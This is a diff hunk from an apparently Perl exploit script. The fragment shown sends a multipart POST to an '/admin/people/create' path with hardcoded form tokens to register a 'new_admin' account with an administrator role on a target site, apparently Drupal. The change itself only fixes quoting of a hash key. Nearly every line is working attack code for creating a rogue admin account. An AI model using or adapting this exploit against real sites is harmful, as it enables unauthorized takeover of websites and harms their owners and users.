@@ -252,7 +252,7 @@ chomp($url);
 
 $mail = 'new_admin@new_admin.com';
 $exploit = "$url/admin/people/create?render=overlay&render=overlay";
-$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => ['name' => 'new_admin', mail => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc' , 'form_id' => 'user_register_form' , 'op' => 'Create new account']);
+$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => ['name' => 'new_admin', 'mail' => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc' , 'form_id' => 'user_register_form' , 'op' => 'Create new account']);
 
 if ($response =~ /200/)
 {
